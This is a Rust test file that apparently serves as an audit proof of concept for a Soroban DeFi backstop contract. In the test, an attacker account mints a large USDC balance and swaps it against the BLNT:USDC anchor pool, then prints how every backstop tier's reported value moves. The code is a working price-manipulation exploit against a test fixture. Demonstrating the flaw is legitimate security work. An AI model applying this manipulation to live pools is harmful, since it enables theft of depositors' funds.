#![cfg(test)]
#![allow(clippy::zero_prefixed_literal)]

use test_suites::{
    create_fixture_with_data,
    test_fixture::{TokenIndex, SCALAR_7},
};

/// Show that a swap against the BLNT:USDC anchor alone moves every configured
/// tier's reported USDC value, including tiers denominated in the BLNT:XLM LP
/// and in plain XLM, which are quoted *through* the anchor in v3.
#[test]
fn poc_anchor_swap_moves_every_tier_value() {
    let fixture = create_fixture_with_data(false);
    let pool_address = fixture.pools[0].pool.address.clone();
    let blnt = &fixture.tokens[TokenIndex::BLNT];
    let usdc = &fixture.tokens[TokenIndex::USDC];
    let attacker = fixture.users[0].clone();

    // Fund the BLNT:XLM (FirstLoss) tier so the cross-quoted leg is visible.
    let blnt_xlm_token = fixture
        .backstop
        .backstop_token(&backstop::BackstopTier::FirstLoss, &pool_address);
    let blnt_xlm = test_suites::liquidity_pool::LPClient::new(&fixture.env, &blnt_xlm_token);
    fixture.tokens[TokenIndex::BLNT].mint(&fixture.users[0], &(500_000 * SCALAR_7));
    fixture.tokens[TokenIndex::XLM].mint(&fixture.users[0], &(500_000 * SCALAR_7));
    blnt_xlm.join_pool(
        &(20_000 * SCALAR_7),
        &soroban_sdk::vec![&fixture.env, i128::MAX, i128::MAX],
        &fixture.users[0],
    );
    blnt_xlm.approve(
        &fixture.users[0],
        &fixture.backstop.address,
        &i128::MAX,
        &fixture.env.ledger().sequence().saturating_add(10_000),
    );
    fixture.backstop.deposit(
        &backstop::BackstopTier::FirstLoss,
        &fixture.users[0],
        &pool_address,
        &(10_000 * SCALAR_7),
    );

    let before = fixture.backstop.pool_data(&pool_address);
    std::println!("active_value before = {}", before.active_value);
    for t in before.tiers.iter() {
        std::println!(
            "  tier {:?}: tokens={} value={}",
            t.asset,
            t.tokens,
            t.value
        );
    }

    usdc.mint(&attacker, &(20_000_000 * SCALAR_7));
    for _ in 0..4 {
        let reserve = fixture.lp.get_balance(&usdc.address);
        fixture.lp.swap_exact_amount_in(
            &usdc.address,
            &(reserve / 4),
            &blnt.address,
            &0,
            &i128::MAX,
            &attacker,
        );
    }

    let after = fixture.backstop.pool_data(&pool_address);
    std::println!("active_value after  = {}", after.active_value);
    for t in after.tiers.iter() {
        std::println!(
            "  tier {:?}: tokens={} value={}",
            t.asset,
            t.tokens,
            t.value
        );
    }
    std::println!(
        "blnt_price {} -> {}",
        fixture.backstop.blnt_price(),
        after.active_value
    );
}
